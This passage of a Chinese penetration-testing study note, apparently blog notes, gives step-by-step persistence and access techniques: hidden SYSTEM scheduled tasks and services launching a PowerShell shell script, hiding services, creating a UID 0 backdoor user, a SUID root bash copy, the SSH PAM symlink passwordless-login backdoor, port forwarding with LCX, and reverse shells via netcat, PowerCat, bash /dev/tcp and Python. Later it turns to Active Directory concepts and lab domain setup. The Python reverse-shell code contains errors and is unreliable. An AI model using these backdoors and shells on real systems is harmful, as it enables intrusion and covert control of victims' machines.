   > `schtasks /create /tn 计划任务名 /tr "计划任务执行文件命令" /sc onstart /ru System`
   >
   > 计划任务以 `SYSTEM` 权限每 10 分钟运行一次
   >
   > `schtasks /create /tn 计划任务名 /tr "计划任务执行文件命令" /sc minute /mo 10 ru system`

   > 例： 计划任务进行权限维持（当系统启动时以 `SYSTEM` 用户调取 `powershell` 运行 `shell.ps1`）
   >
   > `schtasks /create /tn shell /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File C:\User\Administrator\Desktop\keep\shell.ps1" /sc onstart /ru system`

2. `at` 命令（Windows 早期版本）

3. `powershell`



#### 服务维持

##### 服务介绍

服务（即，以前的 `NT` 服务）使用户可以能够创建自己在 `Windows` 会话中长时间运行的可执行应用程序，这些服务可以在计算机启动的时候自动启动，也可以暂停和重新启动，而且不显示任何的用户界面。

这种服务非常适合在服务器上使用，或任何时候，为了不影响在同一台计算机上工作的其他用户，需要长时间运行功能时使用。还可以在不同于登录用户的特定用户账户或默认计算机账户的安全上下文中运行服务

##### 服务维持权限

创建一个服务（服务名为： `shell`）启动 `ps1` 脚本

> 创建服务
>
> `sc create shell start= auto binPath= "cmd.exe /k powershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File C:\Users\Administrator\Desktop\shell.ps1" -obj= Localsystem`
>
> 伪装服务描述
>
> `sc description "shell" "伪装后的服务描述"`
>
> 设置服务自启
>
> `sc config "shell" start= auto`
>
> 启动服务
>
> `net start "shell"`

##### 隐藏服务

隐藏服务

```powershell
sc sdset shell "D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)
(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)
(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
```

恢复隐藏服务

```powershell
sc sdset shell "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
```



#### 其他



### Linux  权限维持

#### 用户维持

##### 用户文件介绍

在 `Linux` 系统中，存在着两个特殊的文件 `/etc/passwd` 和 `/etc/shadow`。

这两个文件中存储着用户名和加密后的密码，在目前大多数 `Linux` 系统中，将加密后的用户密码存放在 `/etc/shadow` 文件中，但是，这个文件只能 `root` 用户查看。

###### `/etc/passwd` 介绍

> 格式：
>
> 用户名： 密码： `UID`（用户`ID`）： `GID`（组`ID`）： 描述： 主目录： 默认`Shell`
>
> 1. 用户名
>
>    就是一串代表用户身份的字符串，仅仅是方便用户记忆。 `Linux` 系统是通过 `UID` 来识别用户身份、分配用户权限的。
>
> 2. 密码
>
>    `x` 表示此用户设有密码，真正的密码保存在 `/etc/shadow` 文件中。在早期的 `Unix` 中，这里保存的是真正的加密密码串，现在的 `Linux` 系统这里基本都是 `x`，真正的密码放置在 `/etc/shadow` 文件中，此文件只有 `root` 用户可以浏览操作，最大限度的保证了密码的安全。
>
> 3. `UID`
>
>    用户 `ID`，每个用户的唯一标识符，是一个 `0~65535` 之间的数字。
>
>    | `UID`范围                 | 用户身份                                                     |
>    | ------------------------- | ------------------------------------------------------------ |
>    | 0                         | 超级用户，也就是系统管理员账户。在 `Linux` 中，只需要把其他用户的 `UID` 改为 `0`，就可以把普通用户升级为超级管理员。 |
>    | 1~999（旧版本是 1 ~ 499） | 系统用户（伪用户）。这个范围的 `UID` 是保留给系统使用的。其中 1~99 用于系统自行创建的账户； 100 ~ 999 分配给由系统账户需求的用户。（这只是一个公认约定的习惯而已，实际上除了 `0` 以外，其他的 `UID` 并无不同。 |
>    | 1000~65535                | 普通用户。                                                   |
>
> 4. `GID`
>
>    组 `ID`，表示用户初始组的 `ID` 号。初始组，是初建用户时用户所属的组，后面附加的组不计入
>
> 5. 描述
>
> 6. 主目录
>
>    用户登录后有操作权限的访问目录，通常称为用户的主目录
>
> 7. 默认 `Shell`
>
>    `Shell` 是 `Linux` 的命令解释器，是用户和 `Linux` 内核之间沟通的桥梁。 `Linux` 默认的解释器是 `/bin/bash`



###### `/etc/shadow` 介绍

用于存储 `Linux` 系统中用户的密码信息，又称之为“影子文件”。

> 格式：
>
> 用户名： 加密密码： 最后一个修改时间： 最小修改时间间隔： 密码有效期： 密码需要变更前的警告天数： 密码过期后的宽限天数： 账号失效时间： 保留字段



##### 特权用户维持

添加普通用户

> 方法1： 创建一个用户名为 `guest`， 密码为 `123456` 的普通用户（`-p` 参数后面需要执行 `openssl` 命令手动加密密码，否则将明文密码存储到 `shadow` 文件后依然无法登录）
>
> ```useradd -p `openssl passwd -1 -salt 'salt' 123456` guest```
>
> 
>
> 方法2： 同上，但是采用 `$(xxx)` 的方式执行系统命令
>
> `useradd -p "$(openssl passwd -1 123456)" guest`
>
> 
>
> 方法3： `chpasswd` 方式
>
> `useradd guest; echo 'guest:123456' | chpasswd`
>
> 
>
> 方法4： `echo -e`  方式
>
> `useradd guest; echo -e "123456\n123456\n" | passwd guest`

添加超级用户：

> 创建超级用户
>
> ```useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/guest ```



#### Suid 维持

##### Suid 介绍

`Suid` 是一种特殊权限，设置了 `suid` 的程序文件，在用户执行该程序时，用户的权限是该程序文件属主权限，例如程序文件的属主是 `root`， 那么执行该程序的用户就将暂时获得 `root` 账户的权限。 `sgid` 和 `suid` 类似，只是执行程式的时候获取的是文件属主的权限。 `passwd` 这个命令程序的权限设置，就是 `suid` 权限。



- 只有可执行的二进制程序文件才可以设定 `suid` 权限，非二进制文件设置 `suid` 权限没有任何意义
- 命令执行者要对该程序文件拥有执行 （`x`）权限
- 命令执行者在执行该程序的时获得改程序文件属主的身份
- `Suid` 权限只在该程序执行过程中有效，也就是说身份改变只是程序执行过程中生效的。

##### Suid 维持

1. 找到 `bash` 文件

   `whereis bash`

2. 复制到普通用户环境能接触到的目录下

   `cp /bin/bash /tmp/.bash`

3. 赋权

   `chmod 4755 /tmp/.bash` 或 `chmod +s /tmp/.bash`

4. 创建普通用户

   ```useradd -p `openssl passwd -1 -salt 'salt' 123456` jack ```

5.  使用普通用户登录，运行 `/tmp/.bash`，这个 `bash` 就是 `root` 权限的



#### PAM 软连接维持

##### PAM 介绍

`PAM` 认证一般遵循这样的顺序： `Service(服务)` --> `PAM(配置文件)` --> `pam_*.so`。

`PAM` 认证首先要确定哪一项服务，然后加载相应的 `PAM` 的配置文件（位于 `/etc/pam.d` 下），最后调用认证文件（位于`/lib/security`下）进行安全认证，用户访问服务器的时候，服务器的某一个服务程序把用户的请求发送到 `PAM` 模块进行认证。 对于不同的服务器应用程序所对应的 `PAM` 模块也是不同的。

如果想查看某个程序是否支持 `PAM` 使用 `ls /etc/pam.d`。



##### 软连接介绍

软连接称之为符号链接（Symbolic Link），也叫软连接。类似于 Windows 的快捷方式。

软连接实际上是一个特殊的文本文件，其中包含有另一个文件的位置信息。

> 创建一个 `test.txt` 文件用来演示
>
> `touch test.txt`
>
> 
>
> 创建软连接
>
> `ln -fs /var/www/html/1.txt test.txt`  
>
> 
>
> 查看软连接（`text.txt` 指向了 `/var/www/html/1.txt`）
>
> `cat test.txt`

##### SSH  软连接后门原理

`SSH` 软连接是 `Linux` 下经典的权限维持方法之一。

其中涉及到一个比较重要的模块 `pam_rootok.so`。 这个模块的功能是**如果用户`UID`时`0`，则返回成功**，当`/etc/pam.d/ssh` 文件配置了 `auth sufficient pam_rootok.so` 时，**可以不需要密码登录**。

当在被控端执行命令 `ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=1234` 建立 `shd` 的软连接后门， `PAM` 认证时就会根据软连接名字到 `/etc/pam.d` 目录下寻找对应的 `PAM` 认证文件，由于软连接的文件名为 `su`， 所以 `SSH` 的认证文件就被替换成了 `/etc/pam.d/su`， 而 `su` 中默认配置了 `auth sufficient pam_rootok.so`， 从而导致 `SSH` 可以免密登录。

##### 软连接维持权限实现

1. 判断当前计算机 `SSH` 是否开启 `PAM` 认证

   `cat /etc/ssh/sshd_config | grep UsePAM` 或 `ls /etc/pam.d` 中查看

2. 查看 `pmd.d`  文件下哪些文件配置了 `pam_rootok`

   `find /etc/pam.d | xargs grep "pam_rootok"`

3. 以 `root` 权限建立 `sshd` 的软连接（`chsh` 配置了 `rootok` 认证）

   `ln -sf /usr/sbin/sshd /tmp/chsh`

4. 更改 `chsh` 的端口

   `/tmp/chsh -oPort 23333`

5. 登录（输入任意密码，即可登录）

   `ssh root@[IP地址] -p [后门端口]`

#### 公私钥维持



#### 计划任务维持



## 隧道搭建

### 隧道技术基础（相关概念）

#### 端口转发和端口映射

> 端口转发，也称之为做隧道，是安全壳（SSH）为网络安全通信使用的一种方法。
> 简单来说，端口转发就是将一个端口收到的流量转发到另一个端口

> 端口映射，是 `NAT` 的一种，功能是把在公网的地址转换成私有地址。
> 简单来说，端口映射就是将一个端口映射到另一个端口供其他人使用

#### HTTP 代理和 Socks 代理

> HTTP 代理使用的是 HTTP 协议，工作在应用层，主要是用来代理浏览器访问网页

> `Socks` 代理使用的是 `Socks` 协议，工作在会话层，主要用来传递数据包。
> `Socks` 代理又分为 `Socks4` 和 `Socks5`，`Socks4` 只支持 `TCP`，而 `Socks5` 支持 `TCP` 和 `UDP`

#### 反弹 Shell

> 反弹 `Shell`（`Reverse Shell`），就是控制端监听某 `TCP/UDP` 端口，被控端发送请求到该端口，并将其命令行的输入输出转到控制端，`Reverse Shell` 与 `telnet、` `ssh` 等标准 `Shell` 对应，本质上是网络概念的用户端和服务端的角色反转。

#### 正向代理和反向代理

> 正向代理是从攻击者电脑主动访问目标机器。 例如通过主动访问目标建立 `Shell` 就是正向 `Shell`

> 反向代理是从目标机器主动连接攻击者电脑。 例如通过在目标机器执行命令访问攻击者电脑建立的 `Shell` 就是反向 `Shell`

#### ICPM 隧道和 DNS 隧道



### 端口转发

#### LCX 端口转发

##### LCX 介绍

> LCX 是一款端口转发工具，分 Windows 版和 Linux 版，Linux 版为 PortMap。

> LCX 有端口映射和端口转发两大功能。例如当目标的 3389 端口只对内开放而不对外开放时，可以使用端口映射将 3389 端口映射到目标的其他端口使用； 当目标处于内网或者目标配置的策略只允许访问固定的某一端口时，也可以通过端口转发突破限制。

Windows 版本 LCX 用法：

> 端口转发：
> `Lcx -listen <监听slave请求的端口> <等待连接的端口>`
> `Lcx -slave <攻击机IP> <监听端口> <目标IP> <目标端口>`
>
> 端口映射：
> `Lcx -tran <等待连接的端口> <目标IP> <目标端口>`

Linux 版本 PortMap 用法：

> `Useage: ./portmap -m method [h1 host1] -p1 port1 [h2 host2] -p2 port2 [-v] [-log filename]`
> `-v: version`
> `-h1: host1`
> `-h2: host2`
> `-p1: port1`
> `-p2: port2`
> `-log: log the data`
> `-m: the action method for this tool`
> `1: listen on port1 and connect to host2:port2`
> `2: listen on port1 and port2`
> `3: connect to host1:port1 and host2:port2`

##### 场景复现（Windows 内网）

- 实验环境
    - 攻击机： `192.168.xxx.aaa`
    - 靶机： `192.168.xxx.bbb`

- 场景复现
    1. 在攻击机上监听本地 `53` 端口并转发到本地 `1111` 端口
        `lcx -listen 53 1111`
    2. 在靶机上将 `3389` 端口转发到攻击机的 `53` 端口
        `lcx -slave 192.168.xxx.aaa 53 127.0.0.1 3389`
    3. 在攻击机上连接远程桌面，地址为： `127.0.0.1: 1111`

##### 场景复现（Linux 公网）

- 实验环境
    - 攻击机：`192.168.xxx.aaa`
    - 靶机：`192.168.xxx.bbb`
    - 攻击机 VPS：xxx.xxx.xxx.xxx

- 场景复现
    1. 在靶机上将 `3389` 端口转发到攻击机 VPS 的 `53` 端口
        `lcx -slave xxx.xxx.xxx.xxx 53 127.0.0.0 3389`
    2. 在 VPS 上监听 `53` 端口并转发到 `1111` 端口
        `./portmap -m 2 p1 53 -p2 1111`
    3. 在攻击机上连接 `xxx.xxx.xxx.xxx:1111`

### 反弹 Shell

> PS：断开连接时，建议先断开连接端

#### Netcat 反弹 Shell

> NetCat，简称 NC。是一个简单、可靠的网络工具，被誉为网络界的瑞士军刀。通过 NC 可以进行端口扫描、反弹 Shell、端口监听和文件传输等操作。

NC 的常用参数：
- `-c`：指定连接后要执行的 Shell 命令
- `-e`：指定连接后要执行的文件名
- `-k`：配置 Socket 一直存活（如不想在 Shell 后使监听断开可以配置此参数）
- `-l`：监听模式
- `-p`：设置本地主机使用的通信端口
- `-u`：使用 UDP 传输协议。默认 TCP
- `-v`：显示指令执行过程。用 `-vv` 会更详细

##### 正向 Shell（两台机器互通）

- Windows
    靶机开启监听： `nc.exe -lvvp 3333 -e C:\Windows\System32\cmd.exe`
    攻击进行连接： `nc.exe 192.168.xxx.xxx 3333`
- Linux
    靶机开启监听： `nc -lvvp 3333 -e /bin/bash`
    攻击进行连接： `nc.exe 192.168.xxx.xxx 3333`

##### 反弹 Shell（靶机可以访问攻击机，攻击机无法直接访问靶机）

- Windows
    攻击开启监听： `nc.exe -lvvp 3333`
    靶机进行连接： `nc.exe -e C:\Windows\System32\cmd.exe 192.168.xxx.xxx 3333`
- Linux
    攻击开启监听： `nc -lvvp 3333`
    靶机进行连接： `nc -e /bin/bash 192.168.xxx.xxx 3333`

##### NC 的其他用法

1. Banner 抓取

`nc -nv IP Port`

2. 端口探测

`nc -v IP Port`
`nc -v -z IP 1~65535`

3. 端口监听

`nc -l -p Port`

4. 文件传输

接收端： `nc -lp Port > file`
发送端： `nc -vn IP Port < file -q 1`（Linux） 或 `nc -vn IP Port < file -w` （Windows）

5. 简易通信

VPS：`nc -l p Port`
靶机：`nc -vn IP Port`

6. 连接远程主机

`nc -nvv IP Port`

#### PowerCat 反弹 Shell

> `PowerCat` 是一个 `powershell` 写的 `TCP/IP` 工具，可以看成 `netcat` 的 `powershell` 实现，并且在里面加入和众多其他功能，如： 文件上传、 `smb` 协议支持、中继模式，生成 `payload`、端口扫描等

##### PowerCat 安装

1. 下载

> `https://github.com/besimorhino/powercat`

2. 导入（`shift` + 鼠标右键，打开 `powershell`）

> `Import-Module .\powercat.ps1`

3. 如果提示“未能加载指定模块”，可能是权限问题

> `Set-ExecutionPolicy Unrestricted`

4. 使用

> `powercat -h`

##### Nc 和 PowerCat 的正向连接

1. 靶机使用 `powercat` 开启监听

> `powercat -l -p 8080 -e cmd.exe -v`

2. 攻击机使用 `nc` 连接

> `nc 192.168.xxx.xxx 8080 -vv`

##### Nc 和 PowerCat 的反向连接

1. 攻击机使用 `nc` 开启监听

> `nc -l -p 8888 -vv`

2. 靶机使用 `powercat` 连接

> `powercat -c 192.168.xxx.xxx -p 8080 -v -e cmd.exe`

##### PowerCat 和 PowerCat 的正向连接

1. 靶机使用 `powercat` 开启监听

2. 攻击机使用 `powercat` 连接

##### PowerCat 和 PowerCat 的反向连接

1. 攻击机使用 `powercat` 开启监听

> `powercat -l -p 8080 -v`

2. 靶机使用 `powercat` 连接

> `powercat -c 192.168.xxx.xxx -p 8080 -v -ep`

##### PowerCat 的其他用法

1. 使用 PowerCat 进行文件传输

> 靶机监听 `9999` 端口，接收一个名为 `test.txt` 的文件
> `powercat -l -p 9999 -of test.txt -v`
>
> 攻击机连接靶机 `9999` 端口并发送 `D:\test.txt` 文件
> `powercat -c 192.168.xxx.xxx -p 9999 -i D:\test.txt -v`

2. 使用 PowerCat 生成 `payload`

> 攻击机生成名为 `shell.ps1` 的 `payload`（生成后需要将 `payload` 脚本上传至靶机）
> `powercat -l -p 8888 -e cmd -v -g >> shell.ps1`
>
> 攻击机连接
> `powercat -c 192.168.xxx.xxx -p 8888 -v`
>
> 靶机上运行脚本
> `.\shell.ps1`

#### Bash 反弹 Shell

##### Bash 介绍

`shell` 也称之为**终端**或者**壳**，是用户与系统内核之间交互的翻译官，而 `bash` 则是 `linux` 中默认使用的 `shell`。

##### Bash 反弹 Shell 命令

> `bash -i >&/dev/tcp/攻击机IP/攻击机端口 0>&1` （对应的监听时，要使用 `tcp`，如： `nc -lvvp 999`）
> `bash -i >&/dev/tcp/攻击机IP/攻击机端口 0>&2`
> `bash -i >&/dev/udp/攻击机IP/攻击机端口 0>&1` （对应的监听时，要使用 `udp`，如： `nc -lup 999`）
> `bash -i >&/dev/udp/攻击机IP/攻击机端口 0>&2`

- `bash -i`： 打开交互式 `shell`
- `&`： 符号用于区分文件和文件描述符
- `>&`： 符号后面跟文件时，表示将标准输出和标准错误输出重定向至文件
- `>&`： 符号后面跟数字时，表示后面的数字是文件描述符。 如果不加 `&` 符号，后面的数字会被当做文件。
- `0`： `Linux` 下的文件描述符。代表标准输入重定向。
- `1`： `Linux` 下的文件描述符。代表标准输出重定向。
- `2`： `Linux` 下的文件描述符。代表错误输出重定向。
- `/dev/tcp`： 是 `Linux` 下的特殊设备，可用于建立 `Socket` 连接，读写这两个文件相当于在 `Socket` 连接中传输数据。
- `/dev/udp`： 同上

- `>&/dev/tcp/IP/PORT`： 表示将标准输出和标准错误重定向到 `/dev/tcp/IP/PORT` 文件下，也就是重定向到攻击机指定端口。此时攻击机就可以看到靶机的命令执行结果。
- `0>&1` 或 `0>&2`： 将标准输入重定向到标准输出。 结合上面标准输出重定向到了攻击机，最终的结果就是标准输入重定向到了攻击机。两条命令组合从而可以通过攻击机输入命令，并且可以看到执行结果输出

#### Python 反弹 Shell

```python
import socket, subprocess, os;

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connection(('192.168.xx.xx', 8080))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(['/bin/bash', '-i'])
```

整理一下，用 `python -c` 执行时，整个 `python` 代码需要放在引号中，每行用分号隔开，注意引号的转义或用单双引号区分开

`python -c "import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connection(('192.168.xx.xx', 8080));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1)；os.dup2(s.fileno(), 2)；p = subprocess.call(['/bin/bash', '-i'])"`



## 域环境



###  内网介绍

>内网也称之为局域网，是指在某一个区域内由多态计算机互连而成的计算机组。
>
>在局域网中，可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等。
>
>内网是封闭的，可以由办公室内的两台计算机组成，也可以由一个公司内的大量计算机组成。

#### 工作组介绍

##### 工作组的概念

> 在一个大型单位，可能会有成百上千台计算机互相连接组成局域网，如果不对其进行分组，那是相当混乱的。
>
> 工作组（`Work Group`）就是为了解决这一问题。将不同的计算机按功能（或部门，或其他分类）分别列入不同的工作组

##### 如何创建工作组合加入工作组

加入工作组：右键【计算机】， 选择【属性】，【更改设置】（`Win10` 选择【高级系统设置】），【更改】，在【计算机名】处输入计算机名称，在【工作组】处输出要加入的工作组名称，重启电脑，进入【网络】就可以看到同一个工作组的成员了



#### 域介绍

> `Windows` 域是计算机网络的一种形式，其中所有用户计算机、打印机和其他安全主体都在位于称为**域控制器**的一个或多个中央计算机集群上的中央数据库中注册。
>
> 身份验证在域控制器上进行。
>
> 在域中使用计算机的每个人都会收到一个唯一的用户账户，然后可以为该账户分配对该域内资源的访问权限。
>
> **域（`Domain`）**是一个有安全边界的计算机集合（安全边界的意思是，如果在两个域中，域`A`中的用户无法访问域`B`中的资源），可以把域理解成升级版的工作组，与工作组相比，域的安全管理控制机制更加严格。用户想要访问域内的资源，必须以合法的身份登录域，而用户对域内的资源拥有什么样的权限，还取决于用户在域内的身份。

##### 单域

> 通常在一个地理位置固定的大公司里，建立一个域就可以满足需求。在一个域内，一般要至少两台域服务器，一台作为 `DC`，另一台作为备份 `DC`。
>
> 活动目录的数据库（包括用户的账号信息）时存储在 `DC` 中的，如果没有备份 `DC`，一旦 `DC` 瘫痪了，域内的其他用户就不能登录该域了。

##### 父域和子域

> 出于管理及其他需求，需要在网络中划分多个域。第一个域称为**父域**，各分部的域称为该域的**子域**。

##### 域树

> **域树**是多个域通过建立信任关系组成的集合。一个域管理员只能管理本域，不能访问或者管理其他域。如果两个域之间需要互相访问，则需要建立信任关系。
>
> 域树内的父域与子域，不但可以按照需要相互管理，还可以跨网络分配文件和打印机等设备及资源，从而在不同的域之间实现网络资源的共享和管理、通信及数据传输。

##### 域森林

> **域森林** 是指多个域树通过建立信任关系组成的集合。

##### 域名服务器（Domain Name Server）

> **域名服务器** 是指用于实现域名和与之相对的IP地址转换的服务器。从对域树的介绍中可以看出，域树中的域名和DNS域名非常相似。
>
> 而实际上，因为域中的计算机是使用DNS来定位域控制器、服务器及其他计算机、网络服务的。所以域的名字就是DNS域的名字。
>
> 在内网渗透测试中，大都是通过寻找 DNS 服务器来确定域控制器的位置的（DNS服务器和域控制器通常配置在同一机器上）

#### 活动目录

> **活动目录（Active Directory， AD）是指域环境中提供目录服务的组件**。
>
> 目录中存储有关网络对象（用户、组、计算机、共享资源、打印机、联系人等）的信息。
>
> 目录服务是指帮助用户快速、准确的从目录中找到其所需信息的服务。
>
> 活动目录实现了目录服务，为企业提供了网络环境的集中式管理机制。
>
> 
>
> **活动目录主要提供以下功能：**
>
> - 账号集中管理： 所有账号均存储在服务器中，以便执行命令和重置密码
> - 软件集中管理： 统一推送软件、安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择需要安装的软件
> - 环境集中管理： 统一客户端桌面、IE、TCPP 协议等设置。增强安全性，统一部署杀毒软件和病毒扫描任务、集中管理用户的计算机权限、统一制定用户密码策略等。可以监控网络，对资源进行统一管理
> - 稳定可靠性： 更可靠、更短的宕机时间。例如： 利用活动目录控制用户访问权限，利用集群、负载均衡等技术对文件服务器进行容灾设置等。

#### 安全域划分

> 划分安全域的目的是将一组安全等级相同的计算机划入同一个网段。
>
> 这个网段内的计算机拥 有相同的网络边界，并在网络边界上通过部署防火墙来实现对其他安全域的网络访问控制策略 (NACL)，从而对允许哪些IP地址访问此域、允许此域访问哪些IP地址和网段进行设置。
>
> 这些措施将使得网络风险最小化，当攻击发生时,可以尽可能地将威胁隔离，从而降低对域内计算机的影响。



> 在一个用路由器连接的内网中，可以将网络划分为三个区域：安全级别最高的内网；安全级别中等的DMZ；安全级别最低的外网（Internet）。这三个区域负责完成不同的任务，因此需要设置不同的访问策略。 
>
> DMZ称为隔离区，是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题而设立的一个非安全系统与安全系统之间的缓冲区。
>
> DMZ位于企业内部网络和外部网络之间。可以在DMZ 中放置一些必须公开的服务器设施，例如企业Web服务器、FTP服务器和论坛服务器等。
>
> DMZ是对外提供服务的区域，因此可以从外部访问。
>
> 在网络边界上一般会部署防火墙及入侵检测、入侵防御产品等。如果有Web应用，还会设置 WAF，从而更加有效地保护内网。攻击者如果要进入内网，首先要突破的就是这重重防御。



> 配置一个拥有DMZ的网络时，通常需要定义如下访问控制策略以实现其屏障功能：
>
> - **内网可以访问外网：** 内网用户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。
>
> - **内网可以访问DMZ：** 此策略使内网用户可以使用或者管理DMZ中的服务器。
>
> - **外网不能访问内网：** 这是防火墙的基本策略。如果要访问，就要通过 PN 的方式来进行
>
> - **外网可以访问DMZ：** 因为DMZ中的服务器需要为外界提供服务，所以外网必须可以访问 DMZ。同时，需要由防火墙来完成从对
>
>   外地址到服务器实际地址的转换。
>
> - **DMZ不能访问内网：** 如果不执行此策略，当攻击者攻陷DMZ时，内网将无法受到保护
>
> - **DMZ不能访问外网：** 此策略也有例外。例如，在DMZ中放置了邮件服务器，就要允许访问外网，否则邮件服务器无法正常工
>
>   作。 



> **内网又可以分为办公区和核心区：**
>
> 办公区：公司员工日常的工作区，一般会安装防病毒软件、主机入侵检测产品等。办公区一般能够访问DMZ。如果运维人员也在办公区，那么部分主机也能访问核心数据区(很多企业还会使用堡垒机来统一管理用户的登录行为)攻击者。如果想进入内网，一般会使用鱼叉攻击、水坑攻击，当然还有社会工程学手段。办公区人员多而杂，变动也很频繁，在安全管理上可能存在诸多漏洞，是攻击者进人内网的重要途径之一。
>
> 
>
> **核心区**：存储企业最重要的数据、文档等信息资产,通过日志记录、安全审计等安全措施进行严密的保护，往往只有很少的主机能够访问。从外部是绝难直接访问核心区的。
>
> 一般来说，能够直接访问核心区的只有运维人员或者IT部门的主管，所以，攻击者会重点关注这些用户的信息(攻击者在内网中进行横向移动攻击时，会优先查找这些主机）

#### 域中计算机的分类

> 域中计算机的分类在域结构的网络中，计算机的身份是不平等的,有域控制器、成员服务器、客户机、独立服务器四种类型。
>
> - **域控制器：** 
>
>   域控制器用于管理所有的网络访问，包括登录服务器、访问共享目录和资源。域控制器中存储了域内所有的账户和策略信息，包括安全策略、用户身份验证信息和账户信息。
>
>   在网络中，可以有多台计算机被配置为域控制器，以分批用户的登录、访问等操作。多个域控制器可以一起工作，自动备份用户账户和活动目录数据。这样，即使部分域控制器痪，网络访问也不会受到影响，提高了网络的安全性和稳定性。
>
> - **成员服务器：**
>
>   成员服务器是指安装了服务器操作系统并加入了域、但没有安装活动目录的计算机，其主要任务是提供网络资源。
>
>   成员服务器的类型通常有文件服务器、应用服务器、数据库服务器、web服务器、邮件服务器、防火墙、远程访问服务器、打印服务器等
>
> - **客户机：**
>
>   域中的计算机可以是安装了其他操作系统的计算机，用户利用这些计算机和域中的账户就可以登录域。这些计算机被称为域中的客户机。域用户账号通过域的安全验证后，即可访间网络中的各种资源。
>
> - **独立服务器：**
>
>   独立服务器和域没有关系。如果服务器既不加入域，也不安装活动目录，就称其为独立服务器。
>
>   独立服务器可以创建工作组、与网络屮的其他计算机共享资源，但不能使用活动目录提供的任何服务，
>
> **域控制器用于存放活动目录数据库，是域中必须要有的，而其他三种计算机则不是必须要有的，也就是说，最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。当然，域中各服务器的角色是可以改变的。例如：独立服务器既可以成为域控制器，也可以加入某个域成为成员服务器**。

### 域环境搭建

| 机器名称                          | 机器IP         |
| --------------------------------- | -------------- |
| WindowsServer 2012 R2（域控）     | 192.168.136.10 |
| WindowsServer 2008 R2（域内主机） | 192.168.136.20 |
| WindowsServer 2008 R2（域内主机） | 192.168.136.30 |

#### 搭建域控环境

> 我这里虚拟机是 Net 方式联网

##### 一、配置服务器网络

> - 静态IP地址：192.168.136.10
> - 子网掩码：255.255.255.0
> - 网关： 192.168.136.2 （默认网关）
> - DNS： 192.168.136.10（指向本机）

![](/images/hvv/域控主机配置_01.png)

##### 二、更改计算机名

> 以 `DC` 为例，修改完成后需要重启

![](/images/hvv/域控主机配置_02_更改计算机名.png)

##### 三、安装域控制器和 DNS

> 打开【服务器管理仪表盘】

![](/images/hvv/域控主机配置_03_安装域控制器和DNS服务.png)

> 点击【添加角色和功能】，下一步，【基于角色或基于功能的安装】

![](/images/hvv/域控主机配置_03_安装域控制器和DNS服务_02.png)

> 从服务器池中选择服务器，选中【DC】，下一步

![](/images/hvv/域控主机配置_03_安装域控制器和DNS服务_03.png)

> 勾选【Active Directory 域服务】和【DNS 服务器】

![](/images/domain/域控主机配置_03_安装域控制器和DNS服务_04.png)

> 【功能】、【AD DS】、【DNS 服务器】都保持默认配置，直接【下一步】，最后点击【安装】

![](/images/hvv/域控主机配置_03_安装域控制器和DNS服务_05.png)

> 安装完成后，先不要关闭窗口

![](/images/hvv/域控主机配置_03_安装域控制器和DNS服务_06.png)

##### 四、升级服务器

> 上一步最后安装完成后，点击中间蓝色字体【将此服务器提升为域控制器】
>
> 如果不小心关闭了，在【仪表盘】右上角【黄色感叹号】中还可以看到

![](/images/hvv/域控主机配置_04_升级域控_01.png)

> 【在部署配置】选项中，选择【添加新林】，指定一个根域名（必须使用和`DNS` 命名约定的根域名，以 `hack.com` 为例）

![](/images/hvv/域控主机配置_04_升级域控_02.png)

> 在【域控制器选项】中，【林功能级别】设置为：`Windows Server 2012 R2`，【域功能级别】设置为： `Windows Server 2012 R2`。（在默认情况下，应该选择 `DNS` 服务器，林中的第一个域控制器必须是全局目录服务器而且不能是只读域控制器（`RODC`））。
>
> 在【键入目录服务还原模式（`DSRM`）密码】处输入密码（这个密码是用来还原目录服务的，这里以 `123abc!@#` 为例）

![](/images/hvv/域控主机配置_04_升级域控_03.png)

> 在【DNS选项】中，忽略“无法创建 DNS 服务器的委派”警告，保持默认配置，点击【下一步】

> 在【其他选项】中，等待 `NetBIOS` 域名自动生成，保持默认配置即可，点击【下一步】

![](/images/hvv/域控主机配置_04_升级域控_04.png)

> 在【路径】中，指定 `AD DS` 数据库、日志、`SYSVOL` 的存储位置，保持默认即可，点击【下一步】

> 在【先决条件检查】中，等待服务器检查，如果失败，按照提示修复，如果成功，则直接点击【下一步】、【安装】

![](/images/hvv/域控主机配置_04_升级域控_05.png)

> 遇到了一个“失败的先决条件”，修复： 为 `administrator` 创建强密码

![](/images/hvv/域控主机配置_04_升级域控_06.png)

> 回到【域服务配置向导】，点击上方的蓝色字体【重新运行先决条件检查】，检查通过，点击【安装】

![](/images/hvv/域控主机配置_04_升级域控_07.png)

> 安装完成后，会自动重启

![](/images/hvv/域控主机配置_04_升级域控_08.png)

##### 五、创建 Active Directory 用户

> 在【控制面板】【系统和安全】【管理工具】中，双击打开【Active Directory 用户和计算机】，展开【`hack.com`】，选中【`User`】并点击鼠标右键打开菜单，选择【新建】【用户】，



#### 域内加入主机

> 以 `Windows Server 2008 R2 x64` 虚拟机为例

##### 一、配置网络

- 静态IP地址：192.168.136.20
- 子网掩码：255.255.255.0
